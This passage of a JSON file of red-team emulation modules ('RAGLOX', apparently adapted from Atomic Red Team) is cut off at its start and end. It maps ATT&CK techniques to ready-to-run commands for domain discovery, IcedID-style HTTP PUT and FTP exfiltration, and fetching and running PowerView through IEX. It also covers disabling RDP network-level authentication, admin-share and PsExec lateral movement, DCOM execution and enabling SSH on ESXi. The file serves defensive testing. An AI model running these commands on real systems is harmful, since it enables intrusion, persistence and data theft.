          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "5838c31e-a0e2-4b9f-b60a-d79d2cb7995e",
      "module_name": "Adfind - Enumerate Active Directory Domain Controller Objects"
    },
    {
      "index": 104,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ip neighbour show\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if ip command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "apt-get install iproute2 -y\n"
        }
      ],
      "rx_module_id": "158bd4dd-6359-40ab-b13c-285b9ef6fa25",
      "module_name": "Remote System Discovery - ip neighbour"
    },
    {
      "index": 105,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Use the ip route command to display the kernels routing tables. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ip route show\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if ip command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "apt-get install iproute2 -y\n"
        }
      ],
      "rx_module_id": "1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1",
      "module_name": "Remote System Discovery - ip route"
    },
    {
      "index": 106,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Use the netstat command to display the kernels routing tables.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "netstat -r | grep default\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d2791d72-b67f-4615-814f-ec824a91f514",
      "module_name": "Remote System Discovery - netstat"
    },
    {
      "index": 107,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if ip command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v ip)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "apt-get install iproute2 -y\n"
        }
      ],
      "rx_module_id": "6c2da894-0b57-43cb-87af-46ea3b501388",
      "module_name": "Remote System Discovery - ip tcp_metrics"
    },
    {
      "index": 108,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\")\n$DirectorySearcher.PropertiesToLoad.Add(\"Name\")\n$Computers = $DirectorySearcher.findall()\nforeach ($Computer in $Computers) {\n  $Computer = $Computer.Properties.name\n  if (!$Computer) { Continue }\n  Write-Host $Computer}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "This PC must be joined to a domain.",
          "check_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).partofdomain -eq $true) {exit 0} else {exit 1}",
          "install_command": "write-host \"This PC must be manually added to a domain.\" "
        }
      ],
      "rx_module_id": "962a6017-1c09-45a6-880b-adc9c57cb22e",
      "module_name": "Enumerate domain computers within Active Directory using DirectorySearcher"
    },
    {
      "index": 109,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "The following RAGLOX test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-AdComputer -Filter *\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "97e89d9e-e3f5-41b5-a90f-1e0825df0fdf",
      "module_name": "Enumerate Active Directory Computers with Get-AdComputer"
    },
    {
      "index": 110,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "The following RAGLOX test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "64ede6ac-b57a-41c2-a7d1-32c6cd35397d",
      "module_name": "Enumerate Active Directory Computers with ADSISearcher"
    },
    {
      "index": 111,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b9d2e8ca-5520-4737-8076-4f08913da2c4",
      "module_name": "Get-DomainController with PowerView"
    },
    {
      "index": 112,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "The following RAGLOX test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }\ncatch { $_; exit $_.Exception.HResult }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad",
      "module_name": "Get-WmiObject to Enumerate Domain Controllers"
    },
    {
      "index": 113,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net group /domain \"Domain controllers\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5843529a-5056-4bc1-9c13-a311e2af4ca0",
      "module_name": "Remote System Discovery - net group Domain Controller"
    },
    {
      "index": 114,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "This test uses Netscan to identify remote hosts in a specified network range.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd /c '#{netscan_path}' /hide /auto:\"$env:temp\\T1018NetscanOutput.txt\" /range:'#{range_to_scan}'",
        "elevation_required": false,
        "cleanup_command": "remove-item \"$env:temp\\T1018NetscanOutput.txt\" -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "netscan_path",
          "description": "NetScan exe location",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\netscan\\64-bit\\netscan.exe"
        },
        {
          "name": "range_to_scan",
          "description": "The IP range to scan with Netscan",
          "type": "string",
          "default_value": "127.0.0.1-127.0.0.1"
        }
      ],
      "prerequisites": [
        {
          "description": "Netscan must be installed\n",
          "check_command": "if (Test-Path \"#{netscan_path}\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\netscan.zip\" \"https://www.softperfect.com/download/files/netscan_portable.zip\"\nExpand-Archive -LiteralPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\netscan.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\netscan\"\n"
        }
      ],
      "rx_module_id": "b8147c9a-84db-4ec1-8eee-4e0da75f0de5",
      "module_name": "Enumerate Remote Hosts with Netscan"
    },
    {
      "index": 115,
      "technique_id": "T1020",
      "technique_name": "Automated Exfiltration",
      "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
        "elevation_required": false,
        "cleanup_command": "$fileName = \"#{file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "file",
          "description": "Exfiltration File",
          "type": "string",
          "default_value": "C:\\temp\\T1020_exfilFile.txt"
        },
        {
          "name": "domain",
          "description": "Destination Domain",
          "type": "url",
          "default_value": "https://google.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0",
      "module_name": "IcedID Botnet HTTP PUT"
    },
    {
      "index": 116,
      "technique_id": "T1020",
      "technique_name": "Automated Exfiltration",
      "description": "Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$sampleData = \"Sample data for exfiltration test\"\nSet-Content -Path \"#{sampleFile}\" -Value $sampleData\n$ftpUrl = \"#{ftpServer}\"\n$creds = Get-Credential -Credential \"#{credentials}\"\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"#{sampleFile}\" -Credential $creds\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"#{sampleFile}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "sampleFile",
          "description": "Path of the sample file to exfiltrate.",
          "type": "String",
          "default_value": "C:\\temp\\T1020__FTP_sample.txt"
        },
        {
          "name": "ftpServer",
          "description": "FTP server URL.",
          "type": "Url",
          "default_value": "ftp://example.com"
        },
        {
          "name": "credentials",
          "description": "FTP server credentials.",
          "type": "String",
          "default_value": "[user:password]"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5b380e96-b0ef-4072-8a8e-f194cb9eb9ac",
      "module_name": "Exfiltration via Encrypted FTP"
    },
    {
      "index": 117,
      "technique_id": "T1021.001",
      "technique_name": "Remote Services: Remote Desktop Protocol",
      "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Server=#{logonserver}\n$User = Join-Path #{domain} #{username}\n$Password=\"#{password}\"\ncmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password\nmstsc /v:$Server\necho \"RDP connection established\"\n",
        "elevation_required": false,
        "cleanup_command": "$p=Tasklist /svc /fi \"IMAGENAME eq mstsc.exe\" /fo csv | convertfrom-csv\nif(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }\n"
      },
      "variables": [
        {
          "name": "logonserver",
          "description": "ComputerName argument default %logonserver%",
          "type": "string",
          "default_value": "$ENV:logonserver.TrimStart(\"\\\")"
        },
        {
          "name": "domain",
          "description": "domain argument default %USERDOMAIN%",
          "type": "string",
          "default_value": "$Env:USERDOMAIN"
        },
        {
          "name": "username",
          "description": "Username argument default %username%",
          "type": "string",
          "default_value": "$ENV:USERNAME"
        },
        {
          "name": "password",
          "description": "Password",
          "type": "string",
          "default_value": "1password2!"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        }
      ],
      "rx_module_id": "355d4632-8cb9-449d-91ce-b566d0253d3e",
      "module_name": "RDP to DomainController"
    },
    {
      "index": 118,
      "technique_id": "T1021.001",
      "technique_name": "Remote Services: Remote Desktop Protocol",
      "description": "Changing RDP Port to Non Standard Port via Powershell\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{NEW_Remote_Port}\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}\n",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{OLD_Remote_Port}\nRemove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction Ignore \nGet-Service TermService | Restart-Service -Force -ErrorAction Ignore \n"
      },
      "variables": [
        {
          "name": "OLD_Remote_Port",
          "description": "Default RDP Listening Port",
          "type": "string",
          "default_value": "3389"
        },
        {
          "name": "NEW_Remote_Port",
          "description": "New RDP Listening Port",
          "type": "string",
          "default_value": "4489"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2f840dd4-8a2e-4f44-beb3-6b2399ea3771",
      "module_name": "Changing RDP Port to Non Standard Port via Powershell"
    },
    {
      "index": 119,
      "technique_id": "T1021.001",
      "technique_name": "Remote Services: Remote Desktop Protocol",
      "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f\nnetsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1\nnetsh advfirewall firewall delete rule name=\"RDPPORTLatest-TCP-In\" >nul 2>&1\nnet stop TermService /y >nul 2>&1\nnet start TermService >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "OLD_Remote_Port",
          "description": "Default RDP Listening Port",
          "type": "string",
          "default_value": "3389"
        },
        {
          "name": "NEW_Remote_Port",
          "description": "New RDP Listening Port",
          "type": "string",
          "default_value": "4489"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "74ace21e-a31c-4f7d-b540-53e4eb6d1f73",
      "module_name": "Changing RDP Port to Non Standard Port via Command_Prompt"
    },
    {
      "index": 120,
      "technique_id": "T1021.001",
      "technique_name": "Remote Services: Remote Desktop Protocol",
      "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "Default_UserAuthentication",
          "description": "Default UserAuthentication registry value",
          "type": "string",
          "default_value": "1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "01d1c6c0-faf0-408e-b368-752a02285cb2",
      "module_name": "Disable NLA for RDP via Command Prompt"
    },
    {
      "index": 121,
      "technique_id": "T1021.002",
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "description": "Connecting To Remote Shares\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} #{password} /u:#{user_name}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user_name",
          "description": "Username",
          "type": "string",
          "default_value": "DOMAIN\\Administrator"
        },
        {
          "name": "share_name",
          "description": "Examples C$, IPC$, Admin$",
          "type": "string",
          "default_value": "C$"
        },
        {
          "name": "password",
          "description": "Password",
          "type": "string",
          "default_value": "P@ssw0rd1"
        },
        {
          "name": "computer_name",
          "description": "Target Computer Name",
          "type": "string",
          "default_value": "Target"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3386975b-367a-4fbb-9d77-4dcf3639ffd3",
      "module_name": "Map admin share"
    },
    {
      "index": 122,
      "technique_id": "T1021.002",
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "description": "Map Admin share utilizing PowerShell\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "share_name",
          "description": "Examples C$, IPC$, Admin$",
          "type": "string",
          "default_value": "C$"
        },
        {
          "name": "map_name",
          "description": "Mapped Drive Letter",
          "type": "string",
          "default_value": "g"
        },
        {
          "name": "computer_name",
          "description": "Target Computer Name",
          "type": "string",
          "default_value": "Target"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "514e9cd7-9207-4882-98b1-c8f791bae3c5",
      "module_name": "Map Admin Share PowerShell"
    },
    {
      "index": 123,
      "technique_id": "T1021.002",
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{psexec_exe}\" #{remote_host} -accepteula -c #{command_path}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_path",
          "description": "File to copy and execute",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        },
        {
          "name": "remote_host",
          "description": "Remote computer to receive the copy and execute the file",
          "type": "string",
          "default_value": "\\\\localhost"
        },
        {
          "name": "psexec_exe",
          "description": "Path to PsExec",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsExec.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})\n",
          "check_command": "if (Test-Path \"#{psexec_exe}\") { exit 0} else { exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_exe}\" -Force\n"
        }
      ],
      "rx_module_id": "0eb03d41-79e4-4393-8e57-6344856be1cf",
      "module_name": "Copy and Execute File with PsExec"
    },
    {
      "index": 124,
      "technique_id": "T1021.002",
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Remote computer to receive the copy and execute the file",
          "type": "string",
          "default_value": "output.txt"
        },
        {
          "name": "command_to_execute",
          "description": "Command to execute for output.",
          "type": "string",
          "default_value": "hostname"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d41aaab5-bdfe-431d-a3d5-c29e9136ff46",
      "module_name": "Execute command writing output to local Admin Share"
    },
    {
      "index": 125,
      "technique_id": "T1021.003",
      "technique_name": "Remote Services: Distributed Component Object Model",
      "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"#{computer_name}\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "computer_name",
          "description": "Name of Computer",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6dc74eb1-c9d6-4c53-b3b5-6f50ae339673",
      "module_name": "PowerShell Lateral Movement using MMC20"
    },
    {
      "index": 126,
      "technique_id": "T1021.003",
      "technique_name": "Remote Services: Distributed Component Object Model",
      "description": "Powershell lateral movement using the Excel COM objects.\n\nReference:\n\nhttps://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "copy c:\\windows\\system32\\calc.exe 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"#{computer_name}\"))\n$com.ActivateMicrosoftApp(\"5\")\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n"
      },
      "variables": [
        {
          "name": "computer_name",
          "description": "Hostname or IP",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "user",
          "description": "Name of user",
          "type": "string",
          "default_value": "admin"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft Excel must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "505f24be-1c11-4694-b614-e01ae1cd2570",
      "module_name": "PowerShell Lateral Movement Using Excel Application Object"
    },
    {
      "index": 127,
      "technique_id": "T1021.004",
      "technique_name": "Remote Services: SSH",
      "description": "An adversary enables the SSH service on a ESXi host to maintain persistent access to the host and to carryout subsequent operations.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq \"TSM-SSH\" } | Start-VMHostService -Confirm:$false\n",
        "elevation_required": true,
        "cleanup_command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq \"TSM-SSH\" } | Stop-VMHostService -Confirm:$false\n"
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
          "check_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
          "install_command": "Install-Module -Name VMware.PowerCLI\n"
        }
      ],
      "rx_module_id": "8f6c14d1-f13d-4616-b7fc-98cc69fe56ec",
      "module_name": "ESXi - Enable SSH via PowerCLI"
    },
    {
      "index": 128,
      "technique_id": "T1021.004",
      "technique_name": "Remote Services: SSH",
      "description": "An adversary enables SSH on an ESXi host to maintain persistence and creeate another command execution interface.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#enable%20service)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"vim-cmd hostsvc/enable_ssh\"\n",
        "elevation_required": false,
        "cleanup_command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"vim-cmd hostsvc/disable_ssh\"\n"
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name or IP of the ESXi server.",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on the ESXi server.",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privileged user's password.",
          "type": "string",
          "default_value": "password"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if we have plink\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "280812c8-4dae-43e9-a74e-1d08ab997c0e",
      "module_name": "ESXi - Enable SSH via VIM-CMD"
    },
    {
      "index": 129,
      "technique_id": "T1021.005",
      "technique_name": "Remote Services:VNC",
      "description": "ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. \nAdversaries can abuse ARD to gain remote code execution and perform lateral movement.\n\nReferences:  https://www.mandiant.com/resources/blog/leveraging-apple-remote-desktop-for-good-and-evil\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet\n",
        "elevation_required": true,
        "cleanup_command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop -configure -privs -none -quiet\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8a930abe-841c-4d4f-a877-72e9fe90b9ea",
      "module_name": "Enable Apple Remote Desktop Agent"
    },
    {
      "index": 130,
      "technique_id": "T1021.006",
